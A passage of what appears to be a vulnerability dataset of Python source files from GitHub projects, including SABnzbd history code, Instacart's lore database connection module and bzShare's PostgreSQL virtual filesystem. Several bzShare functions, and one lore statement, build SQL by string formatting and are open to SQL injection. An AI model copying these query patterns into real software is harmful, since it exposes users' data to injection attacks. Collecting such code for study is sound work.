  return (completed, name, nzb_name, category, pp, script, report, url, status, nzo_id, storage, path,\n            script_log, script_line, download_time, postproc_time, stage_log, downloaded, completeness,\n            fail_message, url_info, bytes, series, nzo.md5sum, password)\n\n\n\ndef unpack_history_info(item):\n    \"\"\" Expands the single line stage_log from the DB\n        into a python dictionary for use in the history display\n    \"\"\"\n    # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n    lst = item['stage_log']\n    if lst:\n        try:\n            lines = lst.split('\\r\\n')\n        except:\n            logging.error(T('Invalid stage logging in history for %s') + ' (\\\\r\\\\n)', unicoder(item['name']))\n            logging.debug('Lines: %s', lst)\n            lines = []\n        lst = [None for x in STAGES]\n        for line in lines:\n            stage = {}\n            try:\n                key, logs = line.split(':::')\n            except:\n                logging.debug('Missing key:::logs \"%s\"', line)\n                key = line\n                logs = ''\n            stage['name'] = key\n            stage['actions'] = []\n            try:\n                logs = logs.split(';')\n            except:\n                logging.error(T('Invalid stage logging in history for %s') + ' (;)', unicoder(item['name']))\n                logging.debug('Logs: %s', logs)\n                logs = []\n            for log in logs:\n                stage['actions'].append(log)\n            try:\n                lst[STAGES[key]] = stage\n            except KeyError:\n                lst.append(stage)\n        # Remove unused stages\n        item['stage_log'] = [x for x in lst if x is not None]\n\n    if item['script_log']:\n        item['script_log'] = ''\n    # The action line is only available for items in the postproc queue\n    if 'action_line' not in item:\n        item['action_line'] = ''\n    return item\n\n\ndef midnight_history_purge():\n    logging.info('Scheduled history purge')\n    history_db = HistoryDB()\n    history_db.auto_history_purge()\n    history_db.close()\n\n\ndef decode_factory(text):\n    \"\"\" Recursively looks through the supplied argument\n        and converts and text to Unicode\n    \"\"\"\n    if isinstance(text, str):\n        return unicoder(text)\n\n    elif isinstance(text, list):\n        new_text = []\n        for t in text:\n            new_text.append(decode_factory(t))\n        return new_text\n\n    elif isinstance(text, dict):\n        new_text = {}\n        for key in text:\n            new_text[key] = decode_factory(text[key])\n        return new_text\n    else:\n        return text\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/instacart/lore/blob/6427211ebbb374f35f3c64406569adb0b77f7114",
        "file_path": "/lore/__init__.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import absolute_import\n\nimport logging\nimport os\nimport sys\nimport atexit\n\nfrom lore import env, util, ansi\nfrom lore.ansi import underline\nfrom lore.util import timer\n\nlogger = logging.getLogger(__name__)\n\nif not (sys.version_info.major == 3 and sys.version_info.minor >= 6):\n    ModuleNotFoundError = ImportError\n\n\n__author__ = 'Montana Low and Jeremy Stanley'\n__copyright__ = 'Copyright  2017, Instacart'\n__credits__ = ['Montana Low', 'Jeremy Stanley', 'Emmanuel Turlay']\n__license__ = 'MIT'\n__version__ = '0.4.45'\n__maintainer__ = 'Montana Low'\n__email__ = 'montana@instacart.com'\n__status__ = 'Development Status :: 3 - Alpha'\n\n\ndef banner():\n    import socket\n    import getpass\n    \n    return '%s in %s on %s' % (\n        ansi.foreground(ansi.GREEN, env.project),\n        ansi.foreground(env.color, env.name),\n        ansi.foreground(ansi.CYAN,\n                        getpass.getuser() + '@' + socket.gethostname())\n    )\n\n\nlore_no_env = False\nif hasattr(sys, 'lore_no_env'):\n    lore_no_env = sys.lore_no_env\n\nif len(sys.argv) > 1 and sys.argv[0][-4:] == 'lore' and sys.argv[1] in ['install', 'init']:\n    lore_no_env = True\n\nif not lore_no_env:\n    # everyone else gets validated and launched on import\n    env.validate()\n    env.launch()\n\nif env.launched():\n    print(banner())\n    logger.info(banner())\n    logger.debug('python environment: %s' % env.prefix)\n\n    if not lore_no_env:\n        with timer('check requirements', logging.DEBUG):\n            install_missing = env.name in [env.DEVELOPMENT, env.TEST]\n            env.check_requirements(install_missing)\n        \n    try:\n        with timer('numpy init', logging.DEBUG):\n            import numpy\n        \n            numpy.random.seed(1)\n            logger.debug('numpy.random.seed(1)')\n    except ModuleNotFoundError as e:\n        pass\n\n    try:\n        with timer('rollbar init', logging.DEBUG):\n            import rollbar\n            rollbar.init(\n                os.environ.get(\"ROLLBAR_ACCESS_TOKEN\", None),\n                allow_logging_basic_config=False,\n                environment=env.name,\n                enabled=(env.name != env.DEVELOPMENT),\n                handler='blocking',\n                locals={\"enabled\": True})\n    \n            def report_error(exc_type, value, tb):\n                import traceback\n                logger.critical('Exception: %s' % ''.join(\n                    traceback.format_exception(exc_type, value, tb)))\n                if hasattr(sys, 'ps1'):\n                    print(''.join(traceback.format_exception(exc_type, value, tb)))\n                else:\n                    rollbar.report_exc_info((exc_type, value, tb))\n            sys.excepthook = report_error\n\n    except ModuleNotFoundError as e:\n        def report_error(exc_type, value, tb):\n            import traceback\n            logger.critical('Exception: %s' % ''.join(\n                traceback.format_exception(exc_type, value, tb)))\n            \n        sys.excepthook = report_error\n        pass\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/instacart/lore/blob/6427211ebbb374f35f3c64406569adb0b77f7114",
        "file_path": "/lore/io/connection.py",
        "source": "import hashlib\nimport inspect\nimport logging\nimport os\nimport re\nimport sys\nimport tempfile\nimport csv\nimport gzip\nfrom datetime import datetime\nfrom time import time\nfrom io import StringIO\nfrom sqlalchemy import event\nfrom sqlalchemy.engine import Engine\nfrom sqlalchemy.schema import DropTable\nfrom sqlalchemy.ext.compiler import compiles\n\nimport pandas\nimport sqlalchemy\n\nimport lore\nfrom lore.util import timer\nfrom lore.stores import query_cached\n\n\nlogger = logging.getLogger(__name__)\n\n\n@compiles(DropTable, 'postgresql')\ndef _compile_drop_table(element, compiler, **kwargs):\n    return compiler.visit_drop_table(element) + ' CASCADE'\n\n\nclass Connection(object):\n    UNLOAD_PREFIX = os.path.join(lore.env.name, 'unloads')\n    IAM_ROLE = os.environ.get('IAM_ROLE', None)\n    \n    def __init__(self, url, **kwargs):\n        for int_value in ['pool_size', 'pool_recycle', 'max_overflow']:\n            if int_value in kwargs:\n                kwargs[int_value] = int(kwargs[int_value])\n        if 'poolclass' in kwargs:\n            kwargs['poolclass'] = getattr(sqlalchemy.pool, kwargs['poolclass'])\n        if '__name__' in kwargs:\n            del kwargs['__name__']\n        self._engine = sqlalchemy.create_engine(url, **kwargs)\n        self._connection = None\n        self._metadata = None\n        self._transactions = []\n    \n    def __enter__(self):\n        if self._connection is None:\n            self._connection = self._engine.connect()\n        self._transactions.append(self._connection.begin())\n        return self\n    \n    def __exit__(self, type, value, traceback):\n        transaction = self._transactions.pop()\n        if type is None:\n            transaction.commit()\n        else:\n            transaction.rollback()\n\n    @staticmethod\n    def path(filename, extension='.sql'):\n        return os.path.join(\n            lore.env.root, lore.env.project, 'extracts',\n            filename + extension)\n\n    def execute(self, sql=None, filename=None, **kwargs):\n        self.__execute(self.__prepare(sql, filename), kwargs)\n\n    def insert(self, table, dataframe, batch_size=None):\n        if batch_size is None:\n            batch_size = len(dataframe)\n\n        if self._connection is None:\n            self._connection = self._engine.connect()\n\n        dataframe.to_sql(\n            table,\n            self._connection,\n            if_exists='append',\n            index=False,\n            chunksize=batch_size\n        )\n\n    def replace(self, table, dataframe, batch_size=None):\n        import migrate.changeset\n        global _after_replace_callbacks\n        \n        with timer('REPLACE ' + table):\n            suffix = datetime.now().strftime('_%Y%m%d%H%M%S').encode('utf-8')\n            self.metadata\n            temp = 'tmp_'.encode('utf-8')\n            source = sqlalchemy.Table(table, self.metadata, autoload=True, autoload_with=self._engine)\n            destination_name = 'tmp_' + hashlib.sha256(temp + table.encode('utf-8') + suffix).hexdigest()[0:56]\n            destination = sqlalchemy.Table(destination_name, self.metadata, autoload=False)\n            for column in source.columns:\n                destination.append_column(column.copy())\n            destination.create()\n\n            original_names = {}\n            for index in source.indexes:\n                # make sure the name is < 63 chars with the suffix\n                name = hashlib.sha256(temp + index.name.encode('utf-8') + suffix).hexdigest()[0:60]\n                original_names[name] = index.name\n                columns = []\n                for column in index.columns:\n                    columns.append(next(x for x in destination.columns if x.name == column.name))\n                new = sqlalchemy.Index(name, *columns)\n                new.unique = index.unique\n                new.table = destination\n                new.create(bind=self._connection)\n            self.insert(destination.name, dataframe, batch_size=batch_size)\n            self.execute(\"BEGIN; SET LOCAL statement_timeout = '1min'; ANALYZE %s; COMMIT;\" % table)\n\n            with self as transaction:\n                backup = sqlalchemy.Table(table + '_b', self.metadata)\n                backup.drop(bind=self._connection, checkfirst=True)\n                source.rename(name=source.name + '_b', connection=self._connection)\n                destination.rename(name=table, connection=self._connection)\n                for index in source.indexes:\n                    index.rename(index.name[0:-2] + '_b', connection=self._connection)\n                for index in destination.indexes:\n                    index.rename(original_names[index.name], connection=self._connection)\n        \n        for func in _after_replace_callbacks:\n            func(destination, source)\n        \n    @property\n    def metadata(self):\n        if not self._metadata:\n            self._metadata = sqlalchemy.MetaData(bind=self._engine)\n\n        return self._metadata\n\n    def select(self, sql=None, filename=None, **kwargs):\n        cache = kwargs.pop('cache', False)\n        sql = self.__prepare(sql, filename)\n        return self._select(sql, kwargs, cache=cache)\n\n    @query_cached\n    def _select(self, sql, bindings):\n        return self.__execute(sql, bindings).fetchall()\n\n    def unload(self, sql=None, filename=None, **kwargs):\n        cache = kwargs.pop('cache', False)\n        sql = self.__prepare(sql, filename)\n        return self._unload(sql, kwargs, cache=cache)\n    \n    @query_cached\n    def _unload(self, sql, bindings):\n        key = hashlib.sha1(str(sql).encode('utf-8')).hexdigest()\n\n        match = re.match(r'.*?select\\s(.*)from.*', sql, flags=re.IGNORECASE | re.UNICODE | re.DOTALL)\n        if match:\n            columns = []\n            nested = 0\n            potential = match[1].split(',')\n            for column in potential:\n                nested += column.count('(')\n                nested -= column.count(')')\n                if nested == 0:\n                    columns.append(column.split()[-1].split('.')[-1].strip())\n                elif column == potential[-1]:\n                    column = re.split('from', column, flags=re.IGNORECASE)[0].strip()\n                    columns.append(column.split()[-1].split('.')[-1].strip())\n        else:\n            columns = []\n        logger.warning(\"Redshift unload requires poorly parsing column names from sql, found: {}\".format(columns))\n\n        sql = \"UNLOAD ('\" + sql.replace('\\\\', '\\\\\\\\').replace(\"'\", \"\\\\'\") + \"') \"\n        sql += \"TO 's3://\" + os.path.join(\n            lore.io.bucket.name,\n            self.UNLOAD_PREFIX,\n            key,\n            ''\n        ) + \"' \"\n        if Connection.IAM_ROLE:\n            sql += \"IAM_ROLE '\" + Connection.IAM_ROLE + \"' \"\n        sql += \"DELIMITER '|' ADDQUOTES GZIP ALLOWOVERWRITE\"\n        if re.match(r'(.*?)(limit\\s+\\d+)(.*)', sql, re.IGNORECASE | re.UNICODE | re.DOTALL):\n            logger.warning('LIMIT clause is not supported by unload, returning full set.')\n            sql = re.sub(r'(.*?)(limit\\s+\\d+)(.*)', r'\\1\\3', sql, flags=re.IGNORECASE | re.UNICODE | re.DOTALL)\n        self.__execute(sql, bindings)\n        return key, columns\n\n    @query_cached\n    def load(self, key, columns):\n        result = [columns]\n        with timer('load:'):\n            for entry in lore.io.bucket.objects.filter(\n                Prefix=os.path.join(self.UNLOAD_PREFIX, key)\n            ):\n                temp = tempfile.NamedTemporaryFile()\n                lore.io.bucket.download_file(entry.key, temp.name)\n                with gzip.open(temp.name, 'rt') as gz:\n                    result += list(csv.reader(gz, delimiter='|', quotechar='\"'))\n        \n            return result\n    \n    @query_cached\n    def load_dataframe(self, key, columns):\n        with timer('load_dataframe:'):\n            frames = []\n            for entry in lore.io.bucket.objects.filter(\n                Prefix=os.path.join(self.UNLOAD_PREFIX, key)\n            ):\n                temp = tempfile.NamedTemporaryFile()\n                lore.io.bucket.download_file(entry.key, temp.name)\n                dataframe = pandas.read_csv(\n                    temp.name,\n                    delimiter='|',\n                    quotechar='\"',\n                    compression='gzip',\n                    error_bad_lines=False\n                )\n                dataframe.columns = columns\n                frames.append(dataframe)\n\n            result = pandas.concat(frames)\n            result.columns = columns\n            buffer = StringIO()\n            result.info(buf=buffer, memory_usage='deep')\n            logger.info(buffer.getvalue())\n            logger.info(result.head())\n            return result\n        \n    def dataframe(self, sql=None, filename=None, **kwargs):\n        cache = kwargs.pop('cache', False)\n        sql = self.__prepare(sql, filename)\n        dataframe = self._dataframe(sql, kwargs, cache=cache)\n        buffer = StringIO()\n        dataframe.info(buf=buffer, memory_usage='deep')\n        logger.info(buffer.getvalue())\n        logger.info(dataframe.head())\n        return dataframe\n        \n    @query_cached\n    def _dataframe(self, sql, bindings):\n        with timer(\"dataframe:\"):\n            if self._connection is None:\n                self._connection = self._engine.connect()\n            dataframe = pandas.read_sql(sql=sql, con=self._connection, params=bindings)\n            return dataframe\n\n    def quote_identifier(self, identifier):\n        return self._engine.dialect.identifier_preparer.quote(identifier)\n        \n\n    def __prepare(self, sql, filename):\n        if sql is None and filename is not None:\n            filename = Connection.path(filename, '.sql')\n            logger.debug(\"READ SQL FILE: \" + filename)\n            with open(filename) as file:\n                sql = file.read()\n        # support mustache style bindings\n        sql = re.sub(r'\\{(\\w+?)\\}', r'%(\\1)s', sql)\n        return sql\n\n    def __execute(self, sql, bindings):\n        if self._connection is None:\n            self._connection = self._engine.connect()\n        return self._connection.execute(sql, bindings)\n\n\n@event.listens_for(Engine, \"before_cursor_execute\", retval=True)\ndef comment_sql_calls(conn, cursor, statement, parameters, context, executemany):\n    conn.info.setdefault('query_start_time', []).append(datetime.now())\n\n    stack = inspect.stack()[1:-1]\n    if sys.version_info.major == 3:\n        stack = [(x.filename, x.lineno, x.function) for x in stack]\n    else:\n        stack = [(x[1], x[2], x[3]) for x in stack]\n\n    paths = [x[0] for x in stack]\n    origin = next((x for x in paths if lore.env.project in x), None)\n    if origin is None:\n        origin = next((x for x in paths if 'sqlalchemy' not in x), None)\n    if origin is None:\n        origin = paths[0]\n    caller = next(x for x in stack if x[0] == origin)\n\n    statement = \"/* %s | %s:%d in %s */\\n\" % (lore.env.project, caller[0], caller[1], caller[2]) + statement\n    logger.debug(statement)\n    return statement, parameters\n\n\n@event.listens_for(Engine, \"after_cursor_execute\")\ndef time_sql_calls(conn, cursor, statement, parameters, context, executemany):\n    total = datetime.now() - conn.info['query_start_time'].pop(-1)\n    logger.info(\"SQL: %s\" % total)\n\n\n_after_replace_callbacks = []\ndef after_replace(func):\n    global _after_replace_callbacks\n    _after_replace_callbacks.append(func)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/bzShare-dev/bzShare/blob/689e0a9f3cf5e0a625104d9df5ccaffd810d4ee9",
        "file_path": "/bzs/db.py",
        "source": "\nimport binascii\nimport copy\nimport datetime\nimport hashlib\nimport psycopg2\nimport pytz\nimport time\nimport uuid\n\nfrom bzs import const\n\ndef get_current_time():\n    \"\"\"Gets the current time, in float since epoch.\"\"\"\n    # return datetime.datetime.now(tz=pytz.timezone(const.get_const('time-zone')))\n    return float(time.time())\n\ndef get_new_uuid(uuid_, uuid_list=None):\n    \"\"\"Creates a new UUID that is not in 'uuid_list' if given.\"\"\"\n    if not uuid_:\n        uuid_ = uuid.uuid4().hex\n        if type(uuid_list) in [set, dict]:\n            while uuid_ in uuid_list:\n                uuid_ = uuid.uuid4().hex\n    return uuid_\n\n################################################################################\n\nclass DatabaseType:\n    def __init__(self):\n        self.connect_params = dict(\n            database=const.get_const('db-name'),\n            user=const.get_const('db-user'),\n            password=const.get_const('db-password'),\n            host=const.get_const('db-host-addr'),\n            port=const.get_const('db-host-port')\n        )\n        self._db = psycopg2.connect(**self.connect_params)\n        self._cur = None\n        return\n\n    def execute(self, command, **args):\n        self._cur = self._db.cursor()\n        try:\n            self._cur.execute(command, **args)\n            final_arr = self._cur.fetchall()\n        except psycopg2.ProgrammingError:\n            # We'll take this as granted... though risky.\n            final_arr = None\n        self._db.commit()\n        self._cur.close()\n        return final_arr\n\n    def init_db(self):\n        # Purge database of obsolete tables\n        self.execute(\"\"\"\n            DROP TABLE core;\n        \"\"\")\n        self.execute(\"\"\"\n            DROP TABLE users;\n        \"\"\")\n        self.execute(\"\"\"\n            DROP TABLE file_system;\n        \"\"\")\n        self.execute(\"\"\"\n            DROP TABLE file_storage;\n        \"\"\")\n        # Creating new tables in order to function\n        self.execute(\"\"\"\n            CREATE TABLE core (\n                index   TEXT,\n                data    BYTEA\n            );\n            CREATE TABLE users (\n                handle          TEXT,\n                password        TEXT,\n                usergroups      TEXT,\n                ip_address      TEXT[],\n                events          TEXT[],\n                usr_name        TEXT,\n                usr_description TEXT,\n                usr_email       TEXT,\n                usr_followers   TEXT[],\n                usr_friends     TEXT[]\n            );\n            CREATE TABLE file_system(\n                uuid        TEXT,\n                file_name   TEXT,\n                owner       TEXT,\n                upload_time DOUBLE PRECISION,\n                sub_folders TEXT[],\n                sub_files   TEXT[][]\n            );\n            CREATE TABLE file_storage (\n                uuid    TEXT,\n                size    BIGINT,\n                count   BIGINT,\n                hash    TEXT,\n                content BYTEA\n            );\n        \"\"\")\n        return\n    pass\n\nDatabase = DatabaseType()\n\n################################################################################\n\nclass FileStorageType:\n    st_uuid_idx = dict()\n    st_hash_idx = dict()\n    # Database entry\n    st_db = Database\n    # Hashing algorithm, could be md5, sha1, sha224, sha256, sha384, sha512\n    # sha384 and sha512 are not recommended due to slow speeds on 32-bit computers\n    hash_algo = hashlib.sha256\n\n    class UniqueFile:\n        def __init__(self, uuid_=None, size=0, count=1, hash_=None, master=None):\n            self.master = master\n            self.uuid = get_new_uuid(uuid_, self.master.st_uuid_idx)\n            self.master.st_uuid_idx[self.uuid] = self\n            self.size = size\n            self.count = count # The number of references\n            self.hash = hash_ # Either way... must specify this!\n            self.master.st_hash_idx[self.hash] = self\n            # Will not contain content, would be indexed in SQL.\n            return\n        pass\n\n    def __init__(self, db=Database):\n        return self.load_sql(db)\n\n    def load_sql(self, db=Database):\n        \"\"\"Loads index of all stored UniqueFiles in database.\"\"\"\n        self.st_db = db\n        for item in self.st_db.execute(\"SELECT uuid, size, count, hash FROM file_storage;\"):\n            s_uuid, s_size, s_count, s_hash = item\n            s_fl = self.UniqueFile(s_uuid, s_size, s_count, s_hash, self)\n            # Inject into indexer\n            self.st_uuid_idx[s_uuid] = s_fl\n            self.st_hash_idx[s_hash] = s_fl\n        return\n\n    def new_unique_file(self, content):\n        \"\"\"Creates a UniqueFile, and returns its UUID in string.\"\"\"\n        n_uuid = get_new_uuid(None, self.st_uuid_idx)\n        n_size = len(content)\n        n_count = 1\n        n_hash = self.hash_algo(content).hexdigest()\n        u_fl = self.UniqueFile(n_uuid, n_size, n_count, n_hash, master=self)\n        # Done indexing, now proceeding to process content into SQL\n        content = binascii.hexlify(content).decode('ascii')\n        # self.st_db.execute('INSERT INTO file_storage (uuid, size, count, hash, content) VALUES (\"%s\", %d, %d, \"%s\", E\"\\\\\\\\x%s\");' % (n_uuid, n_size, n_count, n_hash, content))\n        self.st_db.execute(\"INSERT INTO file_storage (uuid, size, count, hash, content) VALUES ('%s', %d, %d, '%s', E'\\\\x%s');\" % (n_uuid, n_size, n_count, n_hash, content))\n        # Injecting file into main indexer\n        self.st_uuid_idx[n_uuid] = u_fl\n        self.st_hash_idx[n_hash] = u_fl\n        return n_uuid\n\n    def get_content(self, uuid_):\n        try:\n            u_fl = self.st_uuid_idx[uuid_]\n        except Exception:\n            return b''\n        # Got file handle, now querying file data\n        content = self.st_db.execute(\"SELECT content FROM file_storage WHERE uuid = '%d';\" % uuid_)\n        return content\n    pass\n\nFileStorage = FileStorageType()\n\n################################################################################\n\nclass FilesystemType:\n    \"\"\"This is a virtual filesystem based on a relational PostgreSQL database.\n    We might call it a SQLFS. Its tree-topological structure enables it to index\n    files and find siblings quickly. Yet without the B-Tree optimization it would\n    not be easy to maintain a high performance.\n    \"\"\"\n    fs_uuid_idx = dict()\n    fs_root = None\n    fs_db = None\n\n    class fsNode:\n        \"\"\"This is a virtual node on a virtual filesystem SQLFS. The virtual node contains\n        the following data:\n\n            uuid        - The unique identifier: if node is a directory, then this uuid\n                          would be the identifier pointing to the directory; if node is\n                          a file, this identifier would be pointing to the UUID among\n                          the actual files instead of the filesystem.\n            is_dir      - Whether is a directory or not\n            filename    - The actual file / directory name given by the user\n            upload_time - The time uploaded / copied / moved to server\n            f_uuid      - If a file them this indicates its FileStorage UUID.\n\n        Other data designed to maintain the structure of the node includes:\n\n            master        - The filesystem itself.\n            sub_folder    - Removed after filesystem init, temporary use only.\n            sub_files     - Removed after filesystem init, temporary use only.\n            sub_items     - Set of children.\n            sub_names_idx - Contains same data as sub_items, but indexed by name.\n\n        Do process with caution, and use exported methods only.\n        \"\"\"\n\n        def __init__(self, is_dir, file_name, owner, uuid_=None, upload_time=None, sub_folders=set(), sub_files=set(), f_uuid=None, master=None):\n            # The filesystem / master of the node\n            self.master = master\n            # Assigning data\n            self.is_dir = is_dir\n            self.file_name = file_name\n            self.owner = owner\n            # Generate Universally Unique Identifier\n            self.uuid = get_new_uuid(uuid_, master.fs_uuid_idx)\n            master.fs_uuid_idx[self.uuid] = self\n            # Get upload time\n            self.upload_time = upload_time or get_current_time()\n            if not self.is_dir:\n                self.sub_folders = set()\n                self.sub_files = set()\n                self.f_uuid = f_uuid\n            else:\n                # Folder initialization needs to be accounted after init as whole by the main caller\n                self.sub_folders = sub_folders # Temporary\n                self.sub_files = sub_files # Temporary\n            # This is a traversal thing...\n            self.parent = None\n            self.sub_items = set()\n            self.sub_names_idx = dict()\n            return\n        pass\n\n    def __init__(self, db=Database):\n        return self.load_sqlfs(db)\n\n    def load_sqlfs(self, db=Database):\n        self.fs_db = db\n        for item in self.fs_db.execute(\"SELECT uuid, file_name, owner, upload_time, sub_folders, sub_files FROM file_system\"):\n            # Splitting tuple into parts\n            uuid_, file_name, owner, upload_time, sub_folders, sub_files = item\n            # Getting sub files which are expensive stored separately\n            n_sub_files = set()\n            for fil_idx in sub_files:\n                # This is where the order goes, BEAWARE\n                s_uuid = fil_idx[0]\n                s_file_name = fil_idx[1]\n                s_owner = fil_idx[2]\n                try:\n                    s_upload_time = float(fil_idx[3])\n                except:\n                    s_upload_time = get_current_time()\n                s_f_uuid = fil_idx[4]\n                # Pushing...\n                s_file = self.fsNode(False, s_file_name, s_owner, s_uuid, s_upload_time, f_uuid=s_f_uuid, master=self)\n                n_sub_files.add(s_file)\n                self.fs_uuid_idx[s_uuid] = s_file\n            # Getting sub folders as a set but not templating them\n            n_sub_folders = set() # Since reference is passed, should not manipulate this further\n            for fol_idx in sub_folders:\n                n_sub_folders.add(fol_idx)\n            fold_elem = self.fsNode(True, file_name, owner, uuid_, upload_time, n_sub_folders, n_sub_files, master=self)\n            self.fs_uuid_idx[uuid_] = fold_elem\n        # Done importing from SQL database, now attempting to refurbish connexions\n        for uuid_ in self.fs_uuid_idx:\n            item = self.fs_uuid_idx[uuid_]\n            if not item.is_dir:\n                continue\n            # Asserted that it was a folder.\n            for n_sub in item.sub_files:\n                item.sub_items.add(n_sub)\n                item.sub_names_idx[n_sub.file_name] = n_sub\n            for n_sub_uuid in item.sub_folders:\n                try:\n                    n_sub = self.fs_uuid_idx[n_sub_uuid]\n                    item.sub_items.add(n_sub)\n                    item.sub_names_idx[n_sub.file_name] = n_sub\n                except Exception:\n                    pass\n            del item.sub_files\n            del item.sub_folders\n        # Fixing parental occlusions\n        def iterate_fsnode(node):\n            for item in node.sub_items:\n                if item.parent:\n                    continue\n                # Never iterated before\n                item.parent = node\n                iterate_fsnode(item)\n            return\n        for uuid_ in self.fs_uuid_idx: # This would fix all nodes...\n            item = self.fs_uuid_idx[uuid_]\n            iterate_fsnode(item)\n        # Finding root and finishing parent connexions\n        for uuid_ in self.fs_uuid_idx: # Takes the first element that ever occured to me\n            item = self.fs_uuid_idx[uuid_]\n            while item.parent:\n                item = item.parent\n            self.fs_root = item\n            break\n        else:\n            self.make_root()\n        # Traversing root for filename indexing\n        def iterate_node_fn(node):\n            for item in node.sub_items:\n                node.sub_names_idx[item.file_name]\n        # All done, finished initialization\n        return\n\n    def make_root(self):\n        item = self.fsNode(True, '', 'System', master=self)\n        del item.sub_files\n        del item.sub_folders\n        item.sub_items = set()\n        item.parent = None\n        # Done generation, inserting.\n        self.fs_root = item\n        self.fs_uuid_idx[item.uuid] = item\n        # Inserting to SQL.\n        self.fs_db.execute(\"INSERT INTO file_system (uuid, file_name, owner, upload_time, sub_folders, sub_files) VALUES ('%s', '%s', '%s', %f, '{}', '{}');\" % (item.uuid, item.file_name, item.owner, item.upload_time))\n        return\n\n    def locate(self, path, parent=None):\n        \"\"\"Locate the fsNode() of the location 'path'. If 'parent' is given and\n        as it should be a fsNode(), the function look to the nodes directly\n        under this, non-recursively.\"\"\"\n        # On the case it is a referring location, path should be str.\n        if parent:\n            try:\n                item = parent.sub_names_idx[path]\n            except Exception:\n                return None\n            return item\n        # And it is not such a location.\n        # We assert that path should be list().\n        if type(path) == str:\n            path = path.split('/')\n            while '' in path:\n                path.remove('')\n        # Now got array, traversing...\n        item = self.fs_root\n        while path:\n            try:\n                item = item.sub_names_idx[path[0]]\n            except Exception:\n                return None # This object does not exist.\n            path = path[1:]\n        return item\n\n    def _sqlify_fsnode(self, item):\n        n_uuid = item.uuid\n        n_file_name = item.file_name\n        n_owner = item.owner\n        n_upload_time = item.upload_time\n        n_sub_folders = list()\n        n_sub_files = list()\n        for i_sub in item.sub_items:\n            if i_sub.is_dir:\n                n_sub_folders.append(\"\\\"%s\\\"\" % i_sub.uuid)\n            else:\n                s_attr = \"{%s, %s, %s, %s, %s}\" % (\n                    \"\\\"%s\\\"\" % i_sub.uuid,\n                    \"\\\"%s\\\"\" % i_sub.file_name,\n                    \"\\\"%s\\\"\" % i_sub.owner,\n                    \"\\\"%f\\\"\" % i_sub.upload_time,\n                    \"\\\"%s\\\"\" % i_sub.f_uuid\n                )\n                n_sub_files.append(s_attr)\n        # Formatting string\n        n_sub_folders_str = \"'{\" + \", \".join(i for i in n_sub_folders) + \"}'\"\n        n_sub_files_str = \"'{\" + \", \".join(i for i in n_sub_files) + \"}'\"\n        return (n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str)\n\n    def _update_in_db(self, item):\n        # This applies to items in the\n        # We assert that item should be Node.\n        if type(item) == str:\n            item = self.locate(item)\n        if not item:\n            return False\n        # Giving a few but crucial assertions...\n        if not item.is_dir:\n            item = item.parent\n            if not item.is_dir:\n                return False # I should raise, by a matter of fact\n        # Collecting data\n        n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str = self._sqlify_fsnode(item)\n        # Uploading / committing data\n        command = \"UPDATE file_system SET file_name = '%s', owner = '%s', upload_time = %f, sub_folders = %s, sub_files = %s WHERE uuid = '%s';\" % (n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str, n_uuid)\n        self.fs_db.execute(command)\n        return True\n\n    def _insert_in_db(self, item):\n        \"\"\"Create filesystem record of directory 'item' inside database.\"\"\"\n        if not item.is_dir:\n            return False # Must be directory...\n        n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str = self._sqlify_fsnode(item)\n        # Uploading / committing data\n        self.fs_db.execute(\"INSERT INTO file_system (uuid, file_name, owner, upload_time, sub_folders, sub_files) VALUES ('%s', '%s', '%s', %f, %s, %s);\" % (n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str))\n        return\n\n    def get_content(self, item):\n        \"\"\"Gets binary content of the object (must be file) and returns the actual\n        content in bytes.\"\"\"\n        if type(item) == str:\n            item = self.locate(item)\n        if not item:\n            return b''\n        if item.is_dir:\n            return b''\n        return FileStorage.get_content(item.f_uuid)\n\n    def _remove_recursive(self, item):\n        \"\"\"Removes content of a single object and recursively call all its\n        children for recursive removal.\"\"\"\n        # We assert item is fsNode().\n        # Remove recursively.\n        for i_sub in item.sub_items:\n            self._remove_recursive(i_sub)\n        # Delete itself from filesystem.\n        del self.fs_uuid_idx[item.uuid]\n        # Delete itself from SQL database.\n        self.fs_db.execute(\"DELETE FROM file_system WHERE uuid = '%s';\" % item.uuid)\n        return\n\n    def remove(self, path):\n        \"\"\"Removes (recursively) all content of the folder / file itself and\n        all its subdirectories.\"\"\"\n        if type(path) == str:\n            path = self.locate(path)\n            if not path:\n                return False\n        # Done assertion, path is now fsNode().\n        par = path.parent\n        self._remove_recursive(path)\n        if par:\n            par.sub_items.remove(path)\n            del par.sub_names_idx[path.file_name]\n            self._update_in_db(par)\n        return True\n\n    def _copy_recursive(self, item, target_par, new_owner):\n        \"\"\"Copies content of a single object and recursively call all its\n        children for recursive copy, targeted as a child under target_par.\"\"\"\n        # We assert item, target_par are all fsNode().\n        target_node = target_par.sub_names_idx[item.file_name]\n        for i_sub in item.sub_items:\n            i_sub.parent = item\n            item.sub_names_idx[i_sub.file_name] = i_sub\n            self._copy_recursive(i_sub, target_node, new_owner)\n        # Insert into SQL database\n        item.uuid = get_new_uuid(None, self.fs_uuid_idx)\n        self.fs_uuid_idx[item.uuid] = item\n        item.upload_time = get_current_time()\n        if new_owner:\n            item.owner = new_owner # Assignment\n        if item.is_dir:\n            self._insert_in_db(item)\n        return\n\n    def copy(self, source, target_parent, new_owner=None):\n        \"\"\"Copies content of 'source' (recursively) and hang the target object\n        that was copied under the node 'target_parent'. If rename required please call\n        the related functions separatedly.\"\"\"\n        if type(source) == str:\n            source = self.locate(source)\n        if type(target_parent) == str:\n            target_parent = self.locate(target_parent)\n        if not source or not target_parent:\n            return False\n        # Done assertion, now proceed with deep copy\n        target = copy.deepcopy(source)\n        target.parent = target_parent\n        target_parent.sub_items.add(target)\n        target_parent.sub_names_idx[target.file_name] = target\n        self._copy_recursive(target, target_parent, new_owner)\n        # Update target_parent data and return\n        self._update_in_db(target_parent)\n        return True\n\n    def move(self, source, target_parent):\n        if type(source) == str:\n            source = self.locate(source)\n        if type(target_parent) == str:\n            target_parent = self.locate(target_parent)\n        if not 